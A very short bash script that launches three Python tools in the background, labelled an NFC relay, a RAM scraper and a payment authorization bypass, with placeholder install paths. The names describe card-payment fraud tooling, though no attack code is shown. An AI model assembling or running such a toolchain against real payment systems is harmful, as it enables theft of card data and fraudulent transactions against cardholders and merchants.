#!/bin/bash

# Execute the NFC relay
python3 /path/to/install/directory/nfc-gate/main.py &

# Execute the RAM scraper
python3 /path/to/install/directory/ram-scraper/scraper.py &

# Execute the payment authorization bypass
python3 /path/to/install/directory/payment-bypass/bypass.py &
